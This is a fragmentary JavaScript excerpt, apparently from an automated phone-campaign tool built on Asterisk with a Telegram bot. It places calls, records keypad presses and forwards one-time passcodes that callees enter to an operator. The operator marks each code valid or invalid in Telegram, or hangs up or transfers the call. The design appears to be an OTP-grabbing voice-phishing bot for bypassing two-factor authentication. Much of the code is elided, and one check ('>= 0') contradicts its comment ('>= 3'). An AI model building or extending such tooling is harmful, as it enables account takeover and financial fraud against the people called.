...
function verifyOTP(callId, isValid) {
            ...
            adminMessage, {
                ...
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: "✅ Verify OTP",
                                callback_data: `verify_${callId}`
                            },
                            {
                                text: "❌ Invalid OTP",
                                callback_data: `invalid_${callId}`
                            }
                        ],
                        [{
                                text: "📞 Hangup Call",
                                callback_data: `hangup_${callId}`
                            },
                            {
                                text: "📋 Call Details",
                                callback_data: `details_${callId}`
                            }
                        ]
                    ]
                }
    ...
    verification.status = 'awaiting_otp';
...
ami.on("managerevent", async (data) => {
        ...
        if (digit === '1') {
            ...
            if (!pressedNumbers.has(phoneNumber)) {
                ...
                if (settings.campaign_id) {
                    Campaign.increment('dtmfResponses', {
                        where: {
                ...
                telegramQueue.sendMessage(
                    ...
                    otpEnteredMessage, {
                        ...
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                        text: "✅ OTP Valid - Verify",
                                        callback_data: `verify_${matchingCallId}`
                                    },
                                    {
                                        text: "❌ OTP Invalid",
                                        callback_data: `invalid_${matchingCallId}`
                                    }
                                ]
                            ]
                        }
            ...
            // Customer pressed 0 - wants to speak to agent
            console.log(`${phoneNumber} pressed 0 - requesting transfer to agent`);
            ...
            for (const [callId, verification] of pendingVerifications.entries()) {
                if (verification.phoneNumber === phoneNumber &&
                    (verification.status === 'awaiting_otp' || verification.status === 'otp_entered')) {
                    matchingCallId = callId;
                    matchingVerification = verification;
                    break;
                }
            ...
            if (matchingCallId && matchingVerification) {
                ...
                matchingVerification.otpAttempts = (matchingVerification.otpAttempts || 0) + 1;

                console.log(`OTP attempts for ${phoneNumber}: ${matchingVerification.otpAttempts}`);

                // Check if OTP attempts >= 3
                if (matchingVerification.otpAttempts >= 0) {
                    ...
                    ami.action({
                        ...
                        if (err) {
                            console.error('Error redirecting to press-0-transfer:', err);
                        } else {
                    ...
                    const transferMessage =
                        `🔄 <b>TRANSFER INITIATED (Press 0)</b>\n\n` +
                        `📞 Phone: ${escapeHtml(phoneNumber)}\n` +
                        `🆔 Call ID: <code>${escapeHtml(matchingCallId)}</code>\n` +
                        `⏰ Time: ${escapeHtml(new Date().toLocaleString())}\n` +
                        `🔢 OTP Attempts: ${matchingVerification.otpAttempts}\n` +
                        `📋 Customer pressed 0 after ${matchingVerification.otpAttempts} attempts\n\n` +
                    ...
                    pendingVerifications.delete(matchingCallId);
                } else {
                    // Less than 3 attempts, just log it
    ...
    if (data?.event === 'OriginateResponse') {
        if (data.response == 'Success') {
            ...
            if (settings.campaign_id) {
                Campaign.increment('successfulCalls', {
                    where: {
                        id: settings.campaign_id
                    }
                });
        ...
        if (phoneNumber) {
            ...
            if (activeCalls.has(phoneNumber)) {
                ...
                if (isNoAnswer || (callDuration < 5 && !callInfo.dtmfPressed)) {
                    ...
                    if (settings.campaign_id) {
                        Campaign.increment('voicemailCalls', {
                            where: {
                                id: settings.campaign_id
                            }
                        });
